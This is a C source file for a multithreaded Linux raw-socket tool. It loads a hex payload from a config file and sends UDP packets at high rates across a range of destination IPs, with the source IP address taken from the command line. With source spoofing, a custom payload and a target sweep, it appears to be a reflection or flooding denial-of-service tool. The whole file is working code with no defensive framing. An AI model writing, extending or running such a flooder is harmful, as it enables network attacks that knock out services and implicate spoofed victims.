#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>

#define BATCH_SIZE      32
#define ETH_HDRLEN      14
#define IP_HDRLEN       sizeof(struct iphdr)
#define UDP_HDRLEN      sizeof(struct udphdr)


unsigned int PORT;              
unsigned char *payload = NULL;  
size_t        payload_len = 0;  
static atomic_ulong total_sent = 0;
static atomic_ulong total_pps  = 0;


typedef struct { uint32_t s; } XRNG;
static inline uint32_t xnext(XRNG *r) {
  uint32_t x = r->s;
  x ^= x << 13; x ^= x >> 17; x ^= x << 5;
  return r->s = x;
}


unsigned short csum(unsigned short *buf, int nwords) {
  unsigned long sum = 0;
  for (; nwords > 0; nwords--) sum += *buf++;
  sum  = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}


char* trim(char *s) {
  char *end;
  while (isspace((unsigned char)*s)) s++;
  if (*s == 0) return s;
  end = s + strlen(s) - 1;
  while (end > s && isspace((unsigned char)*end)) end--;
  *(end+1) = '\0';
  return s;
}


unsigned char *parse_hex_payload(const char *s, size_t *out_len) {
  size_t sl = strlen(s), i = 0, j = 0;
  unsigned char *buf = malloc(sl);
  if (!buf) { perror("parse_hex_payload"); exit(1); }
  while (i < sl) {
    if (s[i]=='\\' && i+3<sl &&
        (s[i+1]=='x'||s[i+1]=='X') &&
        isxdigit((unsigned char)s[i+2]) &&
        isxdigit((unsigned char)s[i+3])) {
      char hex[3] = { s[i+2], s[i+3], '\0' };
      buf[j++] = (unsigned char)strtol(hex, NULL, 16);
      i += 4;
    } else {
      buf[j++] = (unsigned char)s[i++];
    }
  }
  *out_len = j;
  return buf;
}


void load_config(const char *conf_path) {
  FILE *f = fopen(conf_path, "r");
  if (!f) { perror("打开配置文件失败"); exit(1); }
  char line[512];
  while (fgets(line, sizeof(line), f)) {
    char *s = trim(line);
    if (*s=='\0' || *s=='#' || *s==';') continue;
    char *eq = strchr(s, '=');
    if (!eq) continue;
    *eq = '\0';
    char *key = trim(s), *val = trim(eq+1);
    if (strcmp(key, "port")==0) {
      PORT = (unsigned int)atoi(val);
    } else if (strcmp(key, "payload")==0) {
      free(payload);
      payload = parse_hex_payload(val, &payload_len);
      printf("[+] 负载已加载，长度 = %zu 字节\n", payload_len);
    }
  }
  fclose(f);
}


typedef struct {
  int       sock;
  int       ifindex;
  uint32_t  src_ip;
  uint32_t  dst_start, dst_end;
  int       thread_id, cpu_core;
  int       pps_limit;
  uint8_t   src_mac[6], dst_mac[6];
} thread_arg_t;


static int get_ifindex(const char *ifname) {
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd<0) return -1;
  struct ifreq ifr;
  strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
  if (ioctl(fd, SIOCGIFINDEX, &ifr)<0) { close(fd); return -1; }
  close(fd);
  return ifr.ifr_ifindex;
}


static void *send_thread(void *p) {
  thread_arg_t *t = p;
  cpu_set_t cp; CPU_ZERO(&cp); CPU_SET(t->cpu_core, &cp);
  pthread_setaffinity_np(pthread_self(), sizeof(cp), &cp);

  XRNG rng = { .s = time(NULL) ^ t->thread_id };
  int FRAME_LEN = ETH_HDRLEN + IP_HDRLEN + UDP_HDRLEN + payload_len;
  struct mmsghdr msgs[BATCH_SIZE];
  struct iovec  iovs[BATCH_SIZE];
  char          bufs[BATCH_SIZE][FRAME_LEN];
  struct sockaddr_ll dests[BATCH_SIZE];

  
  for (int i = 0; i < BATCH_SIZE; i++) {
    memcpy(bufs[i]+0,   t->dst_mac, 6);
    memcpy(bufs[i]+6,   t->src_mac, 6);
    *(uint16_t*)(bufs[i]+12) = htons(ETH_P_IP);
    struct iphdr *iph = (void*)(bufs[i] + ETH_HDRLEN);
    iph->ihl=5; iph->version=4; iph->tos=0;
    iph->frag_off=0; iph->ttl=64; iph->protocol=IPPROTO_UDP;
    iph->tot_len = htons(IP_HDRLEN + UDP_HDRLEN + payload_len);
    struct udphdr *udph = (void*)(bufs[i] + ETH_HDRLEN + IP_HDRLEN);
    udph->dest = htons(PORT);
    udph->len  = htons(UDP_HDRLEN + payload_len);
    udph->check = 0;
    memcpy(bufs[i] + ETH_HDRLEN + IP_HDRLEN + UDP_HDRLEN,
           payload, payload_len);
    memset(&msgs[i], 0, sizeof(msgs[i]));
    iovs[i].iov_base = bufs[i];
    iovs[i].iov_len  = FRAME_LEN;
    msgs[i].msg_hdr.msg_iov    = &iovs[i];
    msgs[i].msg_hdr.msg_iovlen = 1;
    dests[i].sll_family  = AF_PACKET;
    dests[i].sll_ifindex = t->ifindex;
    dests[i].sll_halen   = 6;
    memcpy(dests[i].sll_addr, t->dst_mac, 6);
    msgs[i].msg_hdr.msg_name    = &dests[i];
    msgs[i].msg_hdr.msg_namelen = sizeof(dests[i]);
  }

  uint32_t dip = t->dst_start;
  while (dip <= t->dst_end) {
    int cnt=0;
    for (; cnt<BATCH_SIZE && dip<=t->dst_end; cnt++, dip++) {
      char *pkt = bufs[cnt];
      struct iphdr *iph = (void*)(pkt + ETH_HDRLEN);
      iph->saddr = htonl(t->src_ip);
      iph->daddr = htonl(dip);
      iph->id    = htons(xnext(&rng)&0xFFFF);
      iph->check = 0;
      iph->check = csum((unsigned short*)iph, IP_HDRLEN/2);
      struct udphdr *ud = (void*)(pkt + ETH_HDRLEN + IP_HDRLEN);
      ud->source = htons(xnext(&rng)&0xFFFF);
    }
    int sent = sendmmsg(t->sock, msgs, cnt, 0);
    if (sent>0) {
      atomic_fetch_add(&total_sent, sent);
      atomic_fetch_add(&total_pps,   sent);
    }
    if (t->pps_limit>0 && atomic_load(&total_pps)>(unsigned)t->pps_limit) {
      usleep(100);
    }
  }
  return NULL;
}

int main(int argc, char **argv) {
  if (argc != 10) {
    fprintf(stderr,
      "用法: %s <配置文件> <接口> <源MAC> <目标MAC> <源IP> <目标起始IP> <目标结束IP> <线程数> <pps上限>\n",
      argv[0]);
    return 1;
  }
  load_config(argv[1]);

  const char *iface  = argv[2];
  const char *smac   = argv[3];
  const char *dmac   = argv[4];
  uint32_t   src_ip  = ntohl(inet_addr(argv[5]));
  uint32_t   dst_s   = ntohl(inet_addr(argv[6]));
  uint32_t   dst_e   = ntohl(inet_addr(argv[7]));
  int        threads = atoi(argv[8]);
  int        ppslim  = atoi(argv[9]);

  int ifidx = get_ifindex(iface);
  if (ifidx<0) { perror("获取接口索引失败"); return 1; }
  uint8_t src[6], dst[6];
  for (int i=0; i<6; i++) src[i] = (uint8_t)strtoul(smac+3*i, NULL, 16);
  for (int i=0; i<6; i++) dst[i] = (uint8_t)strtoul(dmac+3*i, NULL, 16);

  int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (sock<0) { perror("创建原始套接字失败"); return 1; }
  struct sockaddr_ll ll = { .sll_family=AF_PACKET, .sll_ifindex=ifidx, .sll_protocol=htons(ETH_P_ALL) };
  if (bind(sock, (void*)&ll, sizeof(ll))<0) { perror("绑定接口失败"); return 1; }

  pthread_t *ths = calloc(threads, sizeof(*ths));
  thread_arg_t *args = calloc(threads, sizeof(*args));
  uint32_t total_ips = dst_e - dst_s + 1;
  uint32_t per = total_ips / threads;
  for (int i=0; i<threads; i++) {
    args[i].sock      = sock;
    args[i].ifindex   = ifidx;
    args[i].src_ip    = src_ip;
    args[i].dst_start = dst_s + per*i;
    args[i].dst_end   = (i==threads-1? dst_e : args[i].dst_start+per-1);
    memcpy(args[i].src_mac, src, 6);
    memcpy(args[i].dst_mac, dst, 6);
    args[i].thread_id = i;
    args[i].cpu_core  = i % sysconf(_SC_NPROCESSORS_ONLN);
    args[i].pps_limit = ppslim;
    pthread_create(&ths[i], NULL, send_thread, &args[i]);
  }

  while (1) {
    sleep(1);
    unsigned long c = atomic_load(&total_sent);
    unsigned long p = atomic_exchange(&total_pps, 0);
    printf("\r累计发送: %-10lu 当前PPS: %-8lu", c, p);
    fflush(stdout);
  }
  return 0;
}
